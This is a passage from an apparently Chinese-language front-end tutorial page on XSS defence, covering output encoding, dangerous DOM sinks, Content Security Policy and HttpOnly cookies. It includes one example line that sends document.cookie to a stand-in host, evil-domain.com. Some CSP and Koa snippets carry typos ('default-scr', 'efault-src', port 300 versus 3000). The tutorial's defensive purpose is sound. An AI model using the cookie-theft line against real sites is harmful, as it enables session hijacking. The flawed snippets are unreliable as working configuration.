class=\"hljs-keyword\"\u003evar\u003c/span\u003e __INITIAL_STATE__ = \u003cspan class=\"hljs-title class_\"\u003eJSON\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eparse\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026lt;%= Encoder.forJavaScript(data.to_json) %\u0026gt;\u0026#x27;\u003c/span\u003e);\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- HTML 标签内联监听器 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eonclick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;alert(\u0026#x27;\u0026lt;%= Encode.forJavaScript(UNTRUSTED) %\u0026gt;\u0026#x27;);\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  click me\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- URL 参数 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;/search?value=\u0026lt;%= Encode.forUriComponent(UNTRUSTED) %\u0026gt;\u0026amp;order=1#top\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- URL 路径 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;/page/\u0026lt;%= Encode.forUriComponent(UNTRUSTED) %\u0026gt;\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!--\n  URL.\n  注意：要根据项目情况进行过滤，禁止掉 \u0026quot;javascript:\u0026quot; 链接、非法 Scheme 等\n--\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\n  \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026#x27;\u0026lt;%=\n    urlValidator.isValid(UNTRUSTED) ?\n      Encode.forHtml(UNTRUSTED) :\n    \u0026quot;/404\u0026quot;\n  %\u0026gt;\u0026#x27;\u003c/span\u003e\n\u0026gt;\u003c/span\u003e\n  link\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e禁止执行不可信数据\u003c/h3\u003e\n\u003cp\u003eDOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\u003c/p\u003e\n\u003cp\u003e在使用 \u003ccode\u003e.innerHTML\u003c/code\u003e、\u003ccode\u003e.outerHTML\u003c/code\u003e、\u003ccode\u003edocument.write()\u003c/code\u003e 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 \u003ccode\u003e.textContent\u003c/code\u003e、\u003ccode\u003e.setAttribute()\u003c/code\u003e 等。\u003c/p\u003e\n\u003cp\u003e如果用 Vue / React 技术栈，并且不使用 \u003ccode\u003ev-html\u003c/code\u003e / \u003ccode\u003edangerouslySetInnerHTML\u003c/code\u003e 功能，就在前端 \u003ccode\u003erender\u003c/code\u003e 渲染阶段避免 \u003ccode\u003einnerHTML\u003c/code\u003e、\u003ccode\u003eouterHTML\u003c/code\u003e 的 XSS 隐患。\u003c/p\u003e\n\u003cp\u003e以下方式都能把字符串作为代码运行：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDOM 中的内联事件监听器：如 \u003ccode\u003elocation\u003c/code\u003e、\u003ccode\u003eonclick\u003c/code\u003e、\u003ccode\u003eonerror\u003c/code\u003e、\u003ccode\u003eonload\u003c/code\u003e、\u003ccode\u003eonmouseover\u003c/code\u003e 等\u003c/li\u003e\n\u003cli\u003eHTML DOM 标签属性：\u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e 标签的 \u003ccode\u003ehref\u003c/code\u003e 属性\u003c/li\u003e\n\u003cli\u003eJavaScript 的 \u003ccode\u003eeval()\u003c/code\u003e、\u003ccode\u003esetTimeout()\u003c/code\u003e、\u003ccode\u003esetInterval()\u003c/code\u003e 等\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 内联事件监听器中包含恶意代码 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eonclick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;UNTRUSTED\u0026quot;\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eonerror\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;UNTRUSTED\u0026quot;\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;data:image/png,\u0026quot;\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 链接内包含恶意代码 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;UNTRUSTED\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e1\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;application/javascript\u0026quot;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"language-javascript\"\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// setTimeout()/setInterval() 中调用恶意代码\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003esetTimeout\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;UNTRUSTED\u0026#x27;\u003c/span\u003e);\n  \u003cspan class=\"hljs-built_in\"\u003esetInterval\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;UNTRUSTED\u0026#x27;\u003c/span\u003e);\n\n  \u003cspan class=\"hljs-comment\"\u003e// location 调用恶意代码\u003c/span\u003e\n  location.\u003cspan class=\"hljs-property\"\u003ehref\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\u0026#x27;UNTRUSTED\u0026#x27;\u003c/span\u003e;\n\n  \u003cspan class=\"hljs-comment\"\u003e// eval() 中调用恶意代码\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;UNTRUSTED\u0026#x27;\u003c/span\u003e);\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。\u003c/p\u003e\n\u003ch3\u003e內容安全策略\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e内容安全策略\u003c/strong\u003e（Content Security Policy，简称 CSP）是一种 \u003cstrong\u003e可信白名单\u003c/strong\u003e 作机制，来限制网站中是否可以包含某来源内容。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需提供配置。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e启用 CSP 方式\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e设置 HTTP 头信息的 Content-Security-Policy 字段\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-http\"\u003e\u003cspan class=\"hljs-attribute\"\u003econtent-security-policy\u003c/span\u003e\u003cspan class=\"hljs-punctuation\"\u003e: \u003c/span\u003edefault-scr https:; connect-src https:; font-src https: data:; frame-src https: twitter:; img-src https: data:; media-src https:; object-src https:; script-src \u0026#x27;unsafe-inline\u0026#x27; \u0026#x27;unsafe-eval\u0026#x27; https:; style-src \u0026#x27;unsafe-inline\u0026#x27; https:;\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e通过网页 \u003ccode\u003e\u0026lt;meta\u0026gt;\u003c/code\u003e 标签\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名) --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;Content-Security-Policy\u0026quot;\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;efault-src \u0026#x27;self\u0026#x27;\u0026quot;\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 一个网站管理者允许内容来自信任的域名及其子域名 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;Content-Security-Policy\u0026quot;\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;default-src \u0026#x27;self\u0026#x27; *.trusted.com\u0026quot;\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者（获得），所有脚本必须从特定主机服务器获取可信的代码。 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e\n  \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;Content-Security-Policy\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;default-src \u0026#x27;self\u0026#x27;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com\u0026quot;\u003c/span\u003e\n/\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e\n  \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;Content-Security-Policy\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;default-src https://onlinebanking.jumbobank.com\u0026quot;\u003c/span\u003e\n/\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!--  一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容（从任意位置加载）。 --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;Content-Security-Policy\u0026quot;\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;default-src \u0026#x27;self\u0026#x27; *.mailsite.com; img-src *\u0026quot;\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e启用后，不符合 CSP 的外部资源就会被阻止加载。\u003c/p\u003e\n\u003cp\u003e严格的 CSP 在 XSS 的防范中可以起到下列的作用：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e禁止加载外域代码，防止复杂的攻击逻辑\u003c/li\u003e\n\u003cli\u003e禁止外域提交，网站被攻击后，用户的数据不会泄漏到外域\u003c/li\u003e\n\u003cli\u003e禁止内联脚本执行（规则较严格，目前发现 Github 使用）\u003c/li\u003e\n\u003cli\u003e禁止未授权的脚本执行（新特性，Google Map 移动版在使用）\u003c/li\u003e\n\u003cli\u003e合理使用上报可以及时发现 XSS，利于尽快修复问题\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e更多关于 CSP 的理解可以参考 \u003ca href=\"https://www.zhihu.com/question/21979782\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003eContent Security Policy（CSP）是什么？为什么它能低于 XSS 攻击？\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e或者查看关于 \u003ca href=\"/front-end/computer-networks/http/content-security-policy\"\u003eHTTP CSP 内容安全策略\u003c/a\u003e 的整理。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3\u003eHTTPOnly Cookie\u003c/h3\u003e\n\u003cp\u003e窃取网页 Cookie 的示例：\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-js\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eImage\u003c/span\u003e().\u003cspan class=\"hljs-property\"\u003esrc\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\u0026#x27;http://www.evil-domain.com/steal-cookie.php?cookie=\u0026#x27;\u003c/span\u003e + \u003cspan class=\"hljs-variable language_\"\u003edocument\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003ecookie\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 HttpOnly Cookie 将重要的 Cookie 标记为 \u003ccode\u003ehttp-only\u003c/code\u003e，这样的话当浏览器向 Web 服务器发起请求的时就会带上 Cookie 字段，但是在 JavaScript 脚本中却不能访问这个 Cookie，这样就避免了 XSS 攻击利用 JavaScript 的 \u003ccode\u003edocument.cookie\u003c/code\u003e 获取 Cookie。\u003c/p\u003e\n\u003cp\u003e在 Koa 中设置 Cookie \u003ccode\u003ehttpOnly\u003c/code\u003e 属性：\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eKoa\u003c/span\u003e = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;koa\u0026#x27;\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e app = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eKoa\u003c/span\u003e();\n\napp.\u003cspan class=\"hljs-title function_\"\u003euse\u003c/span\u003e(\u003cspan class=\"hljs-title function_\"\u003easync\u003c/span\u003e (ctx) =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (ctx.\u003cspan class=\"hljs-property\"\u003eurl\u003c/span\u003e === \u003cspan class=\"hljs-string\"\u003e\u0026#x27;/index\u0026#x27;\u003c/span\u003e) {\n    ctx.\u003cspan class=\"hljs-property\"\u003ecookie\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eset\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;cid\u0026#x27;\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\u0026#x27;hello world\u0026#x27;\u003c/span\u003e, {\n      \u003cspan class=\"hljs-comment\"\u003e// 写 Cookie 所在域名\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003edomain\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\u0026#x27;localhost\u0026#x27;\u003c/span\u003e,\n      \u003cspan class=\"hljs-comment\"\u003e// 写 Cookie 所在的路径\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\u0026#x27;/index\u0026#x27;\u003c/span\u003e,\n      \u003cspan class=\"hljs-comment\"\u003e// Cookie 有效时长\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003emaxAge\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e,\n      \u003cspan class=\"hljs-comment\"\u003e// Cookie 失效时间\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003eexpires\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eDate\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;2017-02-15\u0026#x27;\u003c/span\u003e),\n      \u003cspan class=\"hljs-comment\"\u003e// 是否只用于 HTTP 请求中获取\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003ehttpOnly\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n      \u003cspan class=\"hljs-comment\"\u003e// 是否允许重写\u003c/span\u003e\n      \u003cspan class=\"hljs-attr\"\u003eoverwrite\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    });\n\n    ctx.\u003cspan class=\"hljs-property\"\u003ebody\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\u0026#x27;Cookie is ok.\u0026#x27;\u003c/span\u003e;\n  } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n    ctx.\u003cspan class=\"hljs-property\"\u003ebody\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\u0026#x27;Hello world!\u0026#x27;\u003c/span\u003e;\n  }\n});\n\napp.\u003cspan class=\"hljs-title function_\"\u003elisten\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e300\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e() =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003elog\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\u0026#x27;[demo] Cookie is starting at port 3000\u0026#x27;\u003c/span\u003e);\n});\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在 Chrome 浏览器 Application 面板查看 Cookie 缓存可以直到哪些 Cookie 字段设置了 HttpOnly：\u003c/p\u003e\n\u003cpre class=\"hljs\"\u003e\u003ccode class=\"language-jsx\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eReact\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x27;react\u0026#x27;\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e img \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x27;../../assets/web-security/xss-cookies-httponly.jpg\u0026#x27;\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003edefault\u003c/span\u003e () =\u0026gt; \u003cspan class=\"language-xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\u0026quot;Cookies HttpOnly\u0026quot;\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{img}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{720}\u003c/span\u003e /\u0026gt;\u003c/span\u003e\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e参考资料\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📖 MDN: 内容安全策略(CSP)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.bilibili.com/video/av56520828\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📽 Web 安全之 XSS 攻击与防御\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://juejin.im/post/6844903685122703367\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📝 美团技术团队 前端安全系列：如何防止 XSS 攻击?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://yq.aliyun.com/articles/638829\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📝 Web 安全系列：XSS 攻击基础及原理\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://yq.aliyun.com/articles/638935?spm=a2c4e.11153940.blogcont638829.21.74d874d3lHE0qK\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📝 Web 安全系列：XSS 攻击进阶\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://yq.aliyun.com/articles/641535?spm=a2c4e.11153940.blogcont638935.16.6e757039SLyW6B\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📝 Web 安全系列：XSS 攻击进阶\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2016/09/csp.html\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📝 阮一峰 Content Security Policy 入门教程\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cnblogs.com/Wayou/p/intro_to_content_security_policy.html\" target=\"_blank\" rel=\"noopener noreferrer nofollow\"\u003e📝 Content Security Policy（CSP）介绍\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"])</script><script>self.__next_f.push([1,"4:[\"$\",\"div\",null,{\"className\":\"markdown-body\",\"children\":[[\"$\",\"h1\",null,{\"children\":\"XSS 跨站脚本攻击\"}],[\"$\",\"article\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$c\"}}]]}]\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n8:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"1\",{\"children\":\"front-end\"}],[\"$\",\"meta\",\"2\",{\"name\":\"description\",\"content\":\"front-end knowledge\"}],[\"$\",\"link\",\"3\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"16x16\"}]]\n"])</script><script>self.__next_f.push([1,"6:null\n"])</script></body></html>